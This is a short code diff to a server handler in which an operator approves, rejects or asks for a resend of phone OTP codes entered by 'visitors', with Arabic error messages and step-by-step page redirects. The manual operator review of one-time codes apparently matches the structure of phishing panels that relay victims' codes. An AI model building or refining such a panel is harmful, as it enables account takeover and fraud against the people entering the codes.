@@ -890,19 +890,25 @@ async function startServer() {
       };
 
       if (action === "approved") {
+        // Clear any previous rejection messages
         updateData.phoneOtpStatus = "approved";
+        updateData.phoneRejectionMessage = null; // Clear rejection
+        updateData.phoneResendRequested = null; // Clear resend request
         updateData.redirectPage = "step4";
         updateData.currentStep = "_t6";
         updateData.currentPage = "step4";
       } else if (action === "rejected") {
+        // Set rejection - this will clear when new OTP is entered
         updateData.phoneOtpStatus = "rejected";
         updateData.phoneRejectionMessage = "رقم الهاتف غير صحيح - يرجى المحاولة مرة أخرى";
         updateData.phoneRejectionAt = new Date().toISOString();
+        updateData.phoneResendRequested = null; // Clear resend request
       } else if (action === "resend") {
+        // Just notify the customer to re-enter OTP
         updateData.phoneResendRequested = true;
         updateData.phoneResendAt = new Date().toISOString();
-        updateData.phoneRejectionMessage = "الرمز الذي ادخلته غير صحيح يرجى انتظار رمز جديد";
-        updateData.phoneOtpStatus = "pending";
+        // DON'T set phoneRejectionMessage - let customer enter new OTP freely
+        // Don't change phoneOtpStatus - let customer enter new OTP
       }
 
       // Update visitor data so customer can receive the update
